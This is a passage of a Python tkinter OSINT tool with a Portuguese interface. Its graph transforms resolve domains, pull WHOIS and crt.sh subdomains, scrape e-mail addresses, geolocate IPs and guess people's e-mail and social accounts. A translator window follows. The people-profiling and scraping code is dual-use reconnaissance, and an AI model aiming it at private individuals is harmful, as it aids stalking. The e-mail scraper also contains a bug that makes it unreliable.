                except Exception:
                    pass

            elif func_name == "website_to_ip":
                try:
                    from urllib.parse import urlparse
                    parsed = urlparse(val if "://" in val else "https://"+val)
                    host = parsed.netloc or parsed.path
                    ip = socket.gethostbyname(host.split("/")[0])
                    new_entities.append(("IPv4", ip, "Website → IP"))
                except Exception:
                    pass

            elif func_name == "domain_to_whois" or func_name == "ip_to_whois":
                try:
                    # Try python-whois if available, else hackertarget free API
                    whois_data = ""
                    try:
                        w_mod = ensure_package("python-whois", "whois")
                        if w_mod:
                            w = w_mod.whois(val)
                            whois_data = str(w)[:2000]
                        else:
                            raise Exception("no whois lib")
                    except Exception:
                        # fallback to who.is via http? use hackertarget
                        try:
                            url = f"https://api.hackertarget.com/whois/?q={val}"
                            with urllib.request.urlopen(url, timeout=10) as r:
                                whois_data = r.read().decode("utf-8", errors="ignore")[:2000]
                        except Exception as e2:
                            whois_data = f"WHOIS não disponível offline: {e2} - use who.is/whois/{val}"

                    self.after(0, lambda: self.prop_text.insert("end", f"\n\n--- WHOIS {val} ---\n{whois_data}\n"))
                    self.after(0, lambda: self.log(f"WHOIS obtido para {val}"))
                    return
                except Exception as e:
                    self.after(0, lambda: self.log(f"WHOIS erro: {e}"))

            elif func_name == "domain_to_subdomains":
                try:
                    # Use crt.sh free API
                    url = f"https://crt.sh/?q=%25.{val}&output=json"
                    with urllib.request.urlopen(url, timeout=15) as r:
                        data = json.loads(r.read().decode("utf-8", errors="ignore"))
                        subs = set()
                        for entry in data[:50]:
                            name = entry.get("name_value","")
                            for n in name.split("\n"):
                                if val in n and "*" not in n:
                                    subs.add(n.strip())
                        for sub in list(subs)[:15]:
                            new_entities.append(("DNS Name", sub, f"crt.sh sub"))
                    if not new_entities:
                        # brute common subs
                        commons = ["www", "mail", "ftp", "admin", "api", "dev", "test", "blog", "shop", "app"]
                        for c in commons:
                            new_entities.append(("DNS Name", f"{c}.{val}", "brute sub"))
                except Exception as e:
                    self.after(0, lambda: self.log(f"Subdomains crt.sh falhou: {e}, usando brute"))
                    for c in ["www", "mail", "ftp"]:
                        new_entities.append(("DNS Name", f"{c}.{val}", "brute sub"))

            elif func_name == "domain_to_emails":
                # try to fetch homepage and scrape emails
                try:
                    target = val if val.startswith("http") else f"https://{val}"
                    with urllib.request.urlopen(target, timeout=10) as r:
                        html = r.read().decode("utf-8", errors="ignore")
                        emails = re.findall(r'[a-zA-Z0-9._%+-]+@' + re.escape(val), html)
                        for em in set(emails)[:10]:
                            new_entities.append(("Email", em, "scraped"))
                except Exception as e:
                    self.after(0, lambda: self.log(f"Scrape emails falhou: {e}"))

            elif func_name == "domain_to_mx":
                try:
                    # Use dns resolution via google? simple MX check via socket? Use nslookup via subprocess if available
                    import subprocess
                    try:
                        out = subprocess.check_output(["nslookup", "-type=mx", val], timeout=8, stderr=subprocess.STDOUT).decode("utf-8", errors="ignore")
                        for line in out.splitlines():
                            if "mail exchanger" in line.lower() or "mx" in line.lower():
                                self.after(0, lambda l=line: self.log(f"MX: {l.strip()}"))
                    except Exception:
                        self.after(0, lambda: self.log("MX: tente nslookup localmente"))
                    new_entities.append(("DNS Name", f"mx.{val}", "MX record"))
                except Exception:
                    pass

            elif func_name == "ip_to_geo":
                try:
                    url = f"http://ip-api.com/json/{val}"
                    with urllib.request.urlopen(url, timeout=10) as r:
                        j = json.loads(r.read().decode("utf-8"))
                        loc = f"{j.get('city','')}, {j.get('country','')} ISP:{j.get('isp','')}"
                        new_entities.append(("Localização", loc, "GeoIP"))
                except Exception as e:
                    self.after(0, lambda: self.log(f"GeoIP erro: {e}"))

            elif func_name == "person_to_email":
                # mock generation
                base = val.lower().replace(" ", ".")
                doms = ["gmail.com", "hotmail.com", "outlook.com"]
                for d in doms[:2]:
                    new_entities.append(("Email", f"{base}@{d}", "mock person→email"))

            elif func_name == "person_to_social":
                for plat in ["LinkedIn", "Instagram", "Facebook"]:
                    new_entities.append(("Social", f"{plat}: {val}", f"{plat} search"))

            elif func_name == "company_to_domain":
                cleaned = val.lower().replace(" ", "").replace(",","") + ".com"
                new_entities.append(("Domínio", cleaned, "company→domain"))

            elif func_name == "phone_to_info":
                new_entities.append(("Localização", f"Info para {val} - use truecaller API", "Phone info"))

            elif func_name == "generic_to_domain":
                if "." in val:
                    new_entities.append(("Domínio", val, "generic"))

            # Add to graph in main thread
            def add_new():
                for etype, evalue, elabel in new_entities:
                    # avoid duplicate values
                    exists = None
                    for nid2, n2 in self.nodes.items():
                        if n2["value"].lower() == evalue.lower() and n2["type"] == etype:
                            exists = nid2
                            break
                    if exists:
                        self.add_edge(nid, exists, elabel, label)
                    else:
                        new_id = self.add_node(etype, evalue, self.nodes[nid]["x"] + random.randint(80,180), self.nodes[nid]["y"] + random.randint(-120,120), {"transform": label})
                        self.add_edge(nid, new_id, elabel, label)
                self.transform_var.set(f"✔ {label} → {len(new_entities)} novas entidades")
                self.log(f"✔ Transform {label} gerou {len(new_entities)} entidades")

            self.after(0, add_new)

        except Exception as e:
            self.after(0, lambda: self.log(f"Transform erro {func_name}: {e}"))
            self.after(0, lambda: self.transform_var.set(f"Erro: {e}"))

    def auto_layout(self):
        # simple force layout: arrange in circle around center
        if not self.nodes:
            return
        cx, cy = 1000, 800
        n = len(self.nodes)
        radius = max(200, n*30)
        for i, (nid, node) in enumerate(list(self.nodes.items())):
            angle = 2*math.pi*i/n
            node["x"] = cx + radius*math.cos(angle)
            node["y"] = cy + radius*math.sin(angle)
        self.draw_graph()
        self.log("Auto-layout circular aplicado")

    def new_graph(self):
        if self.nodes and not messagebox.askyesno("Novo", "Limpar grafo atual?"):
            return
        self.clear_graph()
        self.log("Novo grafo")

    def clear_graph(self):
        self.nodes = {}
        self.edges = []
        self.node_counter = 0
        self.selected_node = None
        self.canvas.delete("all")
        self.prop_text.delete("1.0", "end")
        self.trans_listbox.delete(0, "end")
        self.update_stats()

    def update_stats(self):
        self.graph_stats.configure(text=f"{len(self.nodes)} entidades | {len(self.edges)} ligações | Zoom: {self.zoom:.1f}x")

    def save_graph(self):
        path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("Maltego JSON", "*.json"), ("Todos", "*.*")], initialfile="maltego_graph.json")
        if not path:
            return
        data = {"nodes": self.nodes, "edges": self.edges, "meta": {"created": datetime.datetime.now().isoformat(), "tool": "OSINIT Maltego CE", "version": "1.0"}}
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            self.log(f"Grafo guardado: {path}")
            messagebox.showinfo("Guardado", f"Grafo guardado em {os.path.basename(path)}")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def load_graph(self):
        path = filedialog.askopenfilename(filetypes=[("JSON", "*.json"), ("Todos", "*.*")])
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            self.nodes = data.get("nodes", {})
            self.edges = data.get("edges", [])
            # fix counter
            max_id = 0
            for nid in self.nodes.keys():
                try:
                    num = int(nid[1:])
                    max_id = max(max_id, num)
                except Exception:
                    pass
            self.node_counter = max_id
            self.draw_graph()
            self.update_stats()
            self.log(f"Grafo carregado: {len(self.nodes)} entidades")
        except Exception as e:
            messagebox.showerror("Erro carregar", str(e))

    def export_png(self):
        try:
            path = filedialog.asksaveasfilename(defaultextension=".ps", filetypes=[("PostScript", "*.ps"), ("PNG via PS", "*.ps")])
            if not path:
                return
            self.canvas.postscript(file=path, colormode="color")
            self.log(f"Export PS: {path} - converta para PNG com ferramenta externa")
            messagebox.showinfo("Exportado", f"PostScript guardado em {path}\nAbra no Photoshop/GIMP ou converta: ps2png")
        except Exception as e:
            messagebox.showerror("Erro export", str(e))

    def export_graphml(self):
        path = filedialog.asksaveasfilename(defaultextension=".graphml", filetypes=[("GraphML", "*.graphml")])
        if not path:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write('<?xml version="1.0" encoding="UTF-8"?><graphml xmlns="http://graphml.graphdrawing.org/xmlns"><graph id="G" edgedefault="directed">')
                for nid, node in self.nodes.items():
                    f.write(f'<node id="{nid}"><data key="type">{node["type"]}</data><data key="value">{node["value"]}</data></node>')
                for i, e in enumerate(self.edges):
                    f.write(f'<edge id="e{i}" source="{e["from"]}" target="{e["to"]}"><data key="label">{e["label"]}</data></edge>')
                f.write('</graph></graphml>')
            self.log(f"GraphML exportado: {path}")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def export_report(self):
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("TXT", "*.txt")])
        if not path:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(f"RELATÓRIO MALTEGO // OSINIT\nGerado: {datetime.datetime.now()}\nEntidades: {len(self.nodes)}\nLigações: {len(self.edges)}\n\n")
                for nid, node in self.nodes.items():
                    f.write(f"[{node['type']}] {node['value']} @ ({node['x']:.0f},{node['y']:.0f})\n")
                    conns = [e for e in self.edges if e['from']==nid or e['to']==nid]
                    for c in conns:
                        other = c['to'] if c['from']==nid else c['from']
                        other_node = self.nodes.get(other, {})
                        f.write(f"  -> [{other_node.get('type','?')}] {other_node.get('value','?')} via {c['label']}\n")
                    f.write("\n")
            self.log(f"Relatório TXT: {path}")
            messagebox.showinfo("Exportado", f"Relatório em {path}")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def copy_selected(self):
        if not self.selected_node:
            return
        node = self.nodes.get(self.selected_node)
        if node:
            self.clipboard_clear()
            self.clipboard_append(f"{node['type']}: {node['value']}")
            self.log(f"Copiado: {node['value']}")

    def send_to_osint(self):
        if not self.selected_node:
            messagebox.showwarning("Aviso", "Selecione entidade para enviar para Buscas OSINT")
            return
        node = self.nodes[self.selected_node]
        # try to add to BUSCAS_FILE if exists
        try:
            buscas = load_json(BUSCAS_FILE, [])
            buscas.append({"tipo": node["type"], "valor": node["value"], "origem": "Maltego", "data": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
            save_json(BUSCAS_FILE, buscas)
            self.log(f"Enviado para OSINT Buscas: {node['value']}")
            messagebox.showinfo("OSINT", f"Entidade {node['value']} enviada para Buscas")
        except Exception as e:
            self.log(f"Erro enviar OSINT: {e}")

    def open_config(self):
        win = tk.Toplevel(self)
        win.title("Maltego Config - APIs")
        win.geometry("500x400")
        win.configure(bg=BG)
        tk.Label(win, text="CONFIGURAÇÃO MALTEGO CE", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(pady=10)
        tk.Label(win, text="APIs opcionais (deixe vazio para usar modos gratuitos)", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack()

        entries = {}
        for key in ["shodan", "virustotal", "whois_api", "crtsh", "ip_api"]:
            fr = tk.Frame(win, bg=BG)
            fr.pack(fill="x", padx=20, pady=5)
            tk.Label(fr, text=key.upper(), bg=BG, fg=TEXT, font=(FONT_MONO, 8), width=12, anchor="w").pack(side="left")
            e = tk.Entry(fr, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
            e.pack(side="left", fill="x", expand=True, ipady=4)
            e.insert(0, self.config.get("apis", {}).get(key, ""))
            entries[key] = e

        def save():
            self.config["apis"] = {k: entries[k].get().strip() for k in entries}
            self.save_config()
            self.log("Config Maltego guardada")
            win.destroy()
            messagebox.showinfo("Guardado", "Configuração Maltego guardada")

        b = tk.Button(win, text="💾 GUARDAR CONFIG", command=save, bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold"), relief="flat", bd=0, pady=8, cursor="hand2")
        b.pack(fill="x", padx=20, pady=20)
        style_button(b)

        tk.Label(win, text="Nota: sem API, o Maltego usa\nsocket DNS, crt.sh público,\nhackertarget.com WHOIS e ip-api.com\nTudo gratuito e sem chave.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7), justify="left").pack(pady=10)

    def create_demo_graph(self):
        if self.nodes:
            return
        # demo like Maltego tutorial
        n1 = self.add_node("Domínio", "google.com", 600, 300)
        n2 = self.add_node("IPv4", "142.250.179.14", 850, 250, {"note": "demo - clique Run Transform DNS para real"})
        n3 = self.add_node("Email", "admin@google.com", 850, 400)
        self.add_edge(n1, n2, "DNS A")
        self.add_edge(n1, n3, "Email found")
        self.log("Grafo demo criado - experimente Transforms com clique direito")


class TranslatorTool(ToolWindow):
    LANGS = {"auto - Detetar": "auto","pt - Português": "pt","en - Inglês": "en","es - Espanhol": "es","fr - Francês": "fr","de - Alemão": "de","it - Italiano": "it","nl - Holandês": "nl","ru - Russo": "ru","zh - Chinês": "zh","ja - Japonês": "ja","ko - Coreano": "ko","ar - Árabe": "ar","hi - Hindi": "hi","tr - Turco": "tr","pl - Polaco": "pl","uk - Ucraniano": "uk","ro - Romeno": "ro","sv - Sueco": "sv","no - Norueguês": "no"}
    LANG_CODES = {"auto - Detetar": "auto","pt - Português": "pt","en - Inglês": "en","es - Espanhol": "es","fr - Francês": "fr","de - Alemão": "de","it - Italiano": "it","nl - Holandês": "nl","ru - Russo": "ru","zh - Chinês": "zh-CN","ja - Japonês": "ja","ko - Coreano": "ko","ar - Árabe": "ar","hi - Hindi": "hi","tr - Turco": "tr","pl - Polaco": "pl","uk - Ucraniano": "uk","ro - Romeno": "ro","sv - Sueco": "sv","no - Norueguês": "no"}
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Tradutor", "760x720")
        self._translating=False
        top=tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=14, pady=14)
        tk.Label(top, text="DE:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.src_var=tk.StringVar(value="auto - Detetar")
        src_menu=tk.OptionMenu(top, self.src_var, *self.LANGS.keys())
        src_menu.configure(bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        src_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        src_menu.pack(side="left", padx=6)
        b_swap=tk.Button(top, text="⇄", command=self.swap_langs, width=3)
        b_swap.pack(side="left", padx=6, ipady=2)
        style_button(b_swap)
        tk.Label(top, text="PARA:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left", padx=(10,0))
        self.tgt_var=tk.StringVar(value="en - Inglês")
        tgt_menu=tk.OptionMenu(top, self.tgt_var, *[k for k in self.LANGS.keys() if not k.startswith("auto")])
        tgt_menu.configure(bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        tgt_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        tgt_menu.pack(side="left", padx=6)
        tk.Label(self, text="TEXTO ORIGINAL", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=14, pady=(0,4))
        self.input_text=scrolledtext.ScrolledText(self, height=10, font=(FONT_MONO, 11), bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.input_text.pack(fill="both", expand=True, padx=14, pady=(0,8))
        self.input_text.bind("<Control-Return>", lambda e: self.translate())
        mid=tk.Frame(self, bg=BG)
        mid.pack(fill="x", padx=14, pady=(0,8))
        b_trans=tk.Button(mid, text="🌐 TRADUZIR (Ctrl+Enter)", command=self.translate, width=22)
        b_trans.pack(side="left", padx=(0,6), ipady=7)
        style_button(b_trans)
        b_trans.configure(font=(FONT_MONO, 9, "bold"))
        b_clear=tk.Button(mid, text="🧹 LIMPAR", command=self.clear, width=10)
        b_clear.pack(side="left", padx=6, ipady=7)
        style_button(b_clear)
        b_paste=tk.Button(mid, text="📋 COLAR", command=self.paste_input, width=10)
        b_paste.pack(side="left", padx=6, ipady=7)
        style_button(b_paste)
        tk.Label(self, text="TRADUÇÃO", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=14, pady=(4,4))
        self.output_text=scrolledtext.ScrolledText(self, height=10, font=(FONT_MONO, 11), bg=PANEL_BG, fg="#00ff88", insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.output_text.pack(fill="both", expand=True, padx=14, pady=(0,8))
        bottom=tk.Frame(self, bg=BG)
        bottom.pack(fill="x", padx=14, pady=(0,14))
        b_copy=tk.Button(bottom, text="📋 COPIAR TRADUÇÃO", command=self.copy_output, width=18)
        b_copy.pack(side="left", padx=(0,6), ipady=6, fill="x", expand=True)
        style_button(b_copy)
        b_save=tk.Button(bottom, text="💾 EXPORTAR", command=self.export, width=14)
        b_save.pack(side="left", padx=6, ipady=6, fill="x", expand=True)
        style_button(b_save)
        b_swap_io=tk.Button(bottom, text="🔃 IN↔OUT", command=self.swap_io, width=10)
        b_swap_io.pack(side="left", padx=(6,0), ipady=6)
        style_button(b_swap_io)
        self.status=tk.Label(self, text="Pronto. Ctrl+Enter traduz.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), wraplength=720, justify="left")
        self.status.pack(anchor="w", padx=14, pady=(0,8))
        self.detected_label=tk.Label(self, text="", bg=BG, fg="#ffb700", font=(FONT_MONO, 8, "bold"))
        self.detected_label.pack(anchor="w", padx=14, pady=(0,4))
    def paste_input(self):
        try:
            txt=self.clipboard_get()
            self.input_text.insert("end", txt)
        except:
            pass
    def clear(self):
        self.input_text.delete("1.0","end")
        self.output_text.delete("1.0","end")
        self.detected_label.configure(text="")
        self.status.configure(text="Limpo.", fg=TEXT_DIM)
    def swap_langs(self):
        src=self.src_var.get()
        tgt=self.tgt_var.get()
        if src.startswith("auto"):
            return
        self.src_var.set(tgt)
        self.tgt_var.set(src)
    def swap_io(self):
        a=self.input_text.get("1.0","end-1c")
        b=self.output_text.get("1.0","end-1c")
        self.input_text.delete("1.0","end")
        self.input_text.insert("1.0", b)
        self.output_text.delete("1.0","end")
        self.output_text.insert("1.0", a)
    def copy_output(self):
        txt=self.output_text.get("1.0","end-1c")
        if txt:
            self.clipboard_clear()
            self.clipboard_append(txt)
            self.status.configure(text="Tradução copiada.", fg="#00ff88")
    def export(self):
        txt_in=self.input_text.get("1.0","end-1c")
        txt_out=self.output_text.get("1.0","end-1c")
        if not txt_out:
            return
        path=filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("TXT","*.txt")])
        if path:
            with open(path,"w",encoding="utf-8") as f:
                f.write(f"ORIGINAL ({self.src_var.get()}):\n{txt_in}\n\nTRADUÇÃO ({self.tgt_var.get()}):\n{txt_out}\n")
            self.status.configure(text=f"Exportado: {path}", fg="#00ff88")
    def translate(self):
        if self._translating:
            return
        text=self.input_text.get("1.0","end-1c").strip()
        if not text:
            self.status.configure(text="Texto vazio.", fg=ERROR)
            return
        self._translating=True
        self.status.configure(text="A traduzir...", fg=ACCENT)
        self.output_text.delete("1.0","end")
        self.output_text.insert("1.0","A traduzir...")
        def worker():
            try:
                translated, detected=self._do_translate(text, self.src_var.get(), self.tgt_var.get())
                self.after(0, lambda: self._on_translated(translated, detected))
            except Exception as e:
                self.after(0, lambda: self._on_error(str(e)))
        threading.Thread(target=worker, daemon=True).start()
    def _do_translate(self, text, src_display, tgt_display):
        src_code=self.LANG_CODES.get(src_display, "auto")
        tgt_code=self.LANG_CODES.get(tgt_display, "en")
        tgt_google=tgt_code.split("-")[0] if tgt_code!="zh-CN" else "zh-CN"
        src_google=src_code if src_code=="auto" else src_code.split("-")[0]
        try:
            url=f"https://translate.googleapis.com/translate_a/single?client=gtx&sl={src_google}&tl={tgt_google}&dt=t&q={urllib.parse.quote(text)}"
            req=urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=12) as resp:
                data=json.loads(resp.read().decode("utf-8"))
                translated="".join([p[0] for p in data[0] if p and p[0]])
                detected=data[2] if len(data)>2 else ""
                if translated.strip():
                    return translated.strip(), detected
                raise ValueError("Google vazio")
        except Exception as e_google:
            try:
                src_mem=src_google if src_google!="auto" else "en"
                langpair=f"{src_mem}|{tgt_google}"
                url2=f"https://api.mymemory.translated.net/get?q={urllib.parse.quote(text)}&langpair={langpair}"
                req2=urllib.request.Request(url2, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req2, timeout=12) as resp2:
                    data2=json.loads(resp2.read().decode("utf-8"))
                    trans=data2.get("responseData",{}).get("translatedText","")
                    if trans:
                        return trans, "MyMemory (fallback)"
                    raise ValueError("MyMemory vazio")
            except Exception as e2:
                raise RuntimeError(f"Google: {e_google} | MyMemory: {e2}")
    def _on_translated(self, translated, detected):
        self._translating=False
        self.output_text.delete("1.0","end")
        self.output_text.insert("1.0", translated)
        if detected:
            self.detected_label.configure(text=f"Detetado: {detected}")
        self.status.configure(text=f"OK: {self.src_var.get()} → {self.tgt_var.get()} | {len(translated)} chars", fg="#00ff88")
    def _on_error(self, err):
        self._translating=False
        self.output_text.delete("1.0","end")
        self.output_text.insert("1.0", f"ERRO: {err}\nVerifica internet.")
        self.status.configure(text=f"Erro: {err[:120]}", fg=ERROR)


# ─────────────────────────────────────────────
# Entrada
# ─────────────────────────────────────────────


# ─────────────────────────────────────────────
if __name__ == "__main__":
    app = LoginWindow()
    app.mainloop()
